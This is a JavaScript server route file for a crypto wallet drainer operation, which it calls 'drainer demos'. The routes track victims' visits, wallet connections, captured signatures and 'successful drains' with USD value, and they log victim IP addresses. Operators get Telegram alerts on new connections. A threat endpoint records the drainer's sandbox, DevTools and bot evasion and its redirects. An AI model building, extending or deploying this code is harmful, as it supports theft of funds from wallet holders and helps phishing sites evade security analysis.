/**
 * ============================================================================
 * SERAPH SERVER - Analytics Routes (v2 - Wallet Connection Notifications)
 * ============================================================================
 * 
 * CHANGES from v1:
 * - Added notification for first-time wallet connections
 * - Import notifyWalletConnection from notification service
 * - Only notify when isNew = true (first-time connection)
 * - Added getCampaignWithOperator() helper for notification data
 * 
 * Public endpoints for tracking visits/connections
 * Protected endpoints for viewing analytics
 * 
 * Accepts both campaign_id (UUID) and campaign_key (hex string) for flexibility
 * Includes 'domain' parameter for per-website tracking
 * ============================================================================
 */

import { Router } from 'express'
import { requireOperator } from '../middleware/auth.js'
import analyticsService from '../services/analytics.service.js'
import { notifyWalletConnection } from '../services/notification.service.js'
import { success, created, badRequest } from '../utils/response.js'
import supabase from '../config/supabase.js'

const router = Router()

/**
 * Resolve campaign ID from either campaign_id (UUID) or campaign_key (hex string)
 */
async function resolveCampaignId(campaignIdOrKey) {
  if (!campaignIdOrKey) return null
  
  // Check if it looks like a UUID (contains dashes)
  if (campaignIdOrKey.includes('-')) {
    // It's a UUID, verify it exists
    const campaign = await analyticsService.getCampaignById(campaignIdOrKey)
    return campaign?.id || null
  }
  
  // It's likely a campaign_key (hex string)
  const { data: campaign } = await supabase
    .from('campaigns')
    .select('id')
    .eq('campaign_key', campaignIdOrKey)
    .single()
  
  return campaign?.id || null
}

/**
 * Get campaign with operator info for notifications
 */
async function getCampaignWithOperator(campaignId) {
  if (!campaignId) return null
  
  try {
    const { data, error } = await supabase
      .from('campaigns')
      .select(`
        id,
        name,
        operator_id,
        operators (
          id,
          username
        )
      `)
      .eq('id', campaignId)
      .single()
    
    if (error) return null
    return data
  } catch {
    return null
  }
}

/**
 * Extract domain from request
 * Priority: body.domain > query.domain > referer header > origin header
 */
function extractDomain(req) {
  // Check body
  if (req.body?.domain) {
    return normalizeDomain(req.body.domain)
  }
  
  // Check query
  if (req.query?.domain) {
    return normalizeDomain(req.query.domain)
  }
  
  // Check referer header
  if (req.headers?.referer) {
    try {
      const url = new URL(req.headers.referer)
      return normalizeDomain(url.hostname)
    } catch (e) {
      // Invalid URL
    }
  }
  
  // Check origin header
  if (req.headers?.origin) {
    try {
      const url = new URL(req.headers.origin)
      return normalizeDomain(url.hostname)
    } catch (e) {
      // Invalid URL
    }
  }
  
  return null
}

/**
 * Normalize domain string
 */
function normalizeDomain(domain) {
  if (!domain) return null
  
  let normalized = domain.toLowerCase().trim()
  
  // Remove protocol
  normalized = normalized.replace(/^https?:\/\//, '')
  
  // Remove www.
  normalized = normalized.replace(/^www\./, '')
  
  // Remove trailing slash and path
  normalized = normalized.split('/')[0]
  
  // Remove port
  normalized = normalized.split(':')[0]
  
  // Basic validation (allow localhost for development)
  if (!normalized || normalized.length < 3) {
    return null
  }
  
  // Allow localhost, otherwise require a dot
  if (normalized !== 'localhost' && !normalized.includes('.')) {
    return null
  }
  
  return normalized
}

// ============================================================================
// PUBLIC TRACKING ENDPOINTS (called by drainer demos)
// ============================================================================

/**
 * POST /analytics/visit
 * Track a page visit (no auth required)
 * 
 * Body: { campaign_id OR campaign_key, referrer?, user_agent?, domain? }
 */
router.post('/visit', async (req, res) => {
  try {
    const { campaign_id, campaign_key, referrer, user_agent } = req.body
    const domain = extractDomain(req)

    // Resolve campaign ID from either campaign_id or campaign_key
    const campaignId = await resolveCampaignId(campaign_id || campaign_key)
    
    if (!campaignId) {
      return badRequest(res, 'Valid campaign_id or campaign_key is required')
    }

    // Verify campaign exists and is active
    const campaign = await analyticsService.getCampaignById(campaignId)
    if (!campaign) {
      return badRequest(res, 'Invalid campaign')
    }

    // Get IP from request
    const ipAddress = req.headers['x-forwarded-for']?.split(',')[0] || 
                      req.socket?.remoteAddress || 
                      null

    await analyticsService.trackVisit({
      campaignId,
      domain,
      referrer,
      userAgent: user_agent,
      ipAddress
    })

    return success(res, { tracked: true, domain: domain || null })
  } catch (err) {
    console.error('[Analytics] Visit tracking error:', err.message)
    // Don't expose errors to client, just acknowledge
    return success(res, { tracked: false })
  }
})

/**
 * POST /analytics/connection
 * Track a wallet connection (no auth required)
 * 
 * Body: { campaign_id OR campaign_key, wallet_address, chain_id?, domain? }
 * 
 * NEW in v2: Sends Telegram notification on FIRST-TIME connections only
 */
router.post('/connection', async (req, res) => {
  try {
    const { campaign_id, campaign_key, wallet_address, chain_id } = req.body
    const domain = extractDomain(req)

    // Resolve campaign ID
    const campaignId = await resolveCampaignId(campaign_id || campaign_key)
    
    if (!campaignId) {
      return badRequest(res, 'Valid campaign_id or campaign_key is required')
    }

    if (!wallet_address) {
      return badRequest(res, 'wallet_address is required')
    }

    // Verify campaign exists
    const campaign = await analyticsService.getCampaignById(campaignId)
    if (!campaign) {
      return badRequest(res, 'Invalid campaign')
    }

    // Track the connection
    const result = await analyticsService.trackConnection({
      campaignId,
      walletAddress: wallet_address,
      chainId: chain_id,
      domain
    })

    // =========================================================================
    // NEW: Send Telegram notification for FIRST-TIME connections only
    // No email - Telegram only as requested
    // =========================================================================
    if (result.isNew) {
      try {
        // Get campaign with operator info for notification
        const campaignWithOperator = await getCampaignWithOperator(campaignId)
        
        if (campaignWithOperator) {
          // Fire and forget - don't wait for notification to complete
          notifyWalletConnection({
            walletAddress: wallet_address,
            chainId: chain_id || 11155111,
            domain,
            campaignId,
            campaignName: campaignWithOperator.name,
            operatorId: campaignWithOperator.operator_id,
            operatorUsername: campaignWithOperator.operators?.username
          })
          
          console.log(`[Analytics] First-time connection notification sent for ${wallet_address.slice(0, 10)}...`)
        }
      } catch (notifyErr) {
        // Don't fail the request if notification fails
        console.warn('[Analytics] Connection notification failed:', notifyErr.message)
      }
    }

    return success(res, { 
      tracked: true,
      isNew: result.isNew,
      domain: domain || null
    })
  } catch (err) {
    console.error('[Analytics] Connection tracking error:', err.message)
    return success(res, { tracked: false })
  }
})

/**
 * POST /analytics/signature
 * Track a signature captured (no auth required)
 * 
 * Body: { campaign_id OR campaign_key, domain? }
 */
router.post('/signature', async (req, res) => {
  try {
    const { campaign_id, campaign_key } = req.body
    const domain = extractDomain(req)

    // Resolve campaign ID
    const campaignId = await resolveCampaignId(campaign_id || campaign_key)
    
    if (!campaignId) {
      return success(res, { tracked: false })
    }

    await analyticsService.trackSignature({
      campaignId,
      domain
    })

    return success(res, { tracked: true, domain: domain || null })
  } catch (err) {
    console.error('[Analytics] Signature tracking error:', err.message)
    return success(res, { tracked: false })
  }
})

/**
 * POST /analytics/drain
 * Track a successful drain (no auth required)
 * 
 * Body: { campaign_id OR campaign_key, value_usd?, domain? }
 */
router.post('/drain', async (req, res) => {
  try {
    const { campaign_id, campaign_key, value_usd } = req.body
    const domain = extractDomain(req)

    // Resolve campaign ID
    const campaignId = await resolveCampaignId(campaign_id || campaign_key)
    
    if (!campaignId) {
      return success(res, { tracked: false })
    }

    await analyticsService.trackDrain({
      campaignId,
      domain,
      valueUsd: value_usd
    })

    return success(res, { tracked: true, domain: domain || null })
  } catch (err) {
    console.error('[Analytics] Drain tracking error:', err.message)
    return success(res, { tracked: false })
  }
})

/**
 * POST /analytics/threat
 * Log security threat detections (no auth required)
 * 
 * Body: { 
 *   campaignKey, domain, reason, threatLevel, 
 *   threats, action, target, userAgent, url 
 * }
 * 
 * Used by Onyx Protocol's anti-detection system to log:
 * - VM/Sandbox detections
 * - DevTools detections  
 * - Bot/Automation detections
 */
router.post('/threat', async (req, res) => {
  try {
    const { 
      campaignKey,
      domain,
      reason,
      threatLevel,
      threats,
      action,
      target,
      userAgent,
      url
    } = req.body

    // Resolve campaign ID if provided
    let campaignId = null
    if (campaignKey) {
      campaignId = await resolveCampaignId(campaignKey)
    }

    // Store in database for analysis
    if (campaignId) {
      await supabase.from('security_threats').insert({
        campaign_id: campaignId,
        domain: domain || extractDomain(req),
        reason,
        threat_level: threatLevel,
        threats: threats || [],
        action_taken: action,
        redirect_target: target,
        user_agent: userAgent,
        page_url: url,
        ip_address: req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress,
        created_at: new Date().toISOString()
      })
    }

    // Always return success (fire and forget)
    return success(res, { logged: true })
    
  } catch (err) {
    console.error('[Analytics] Threat logging error:', err.message)
    // Don't fail - fire and forget
    return success(res, { logged: false })
  }
})

// ============================================================================
// PROTECTED ENDPOINTS (for operator panel)
// ============================================================================

/**
 * GET /analytics/campaigns/:id
 * Get analytics for a specific campaign
 */
router.get('/campaigns/:id', requireOperator, async (req, res) => {
  try {
    const analytics = await analyticsService.getCampaignAnalytics(
      req.params.id,
      req.user.id
    )

    return success(res, analytics)
  } catch (err) {
    return badRequest(res, err.message)
  }
})

export default router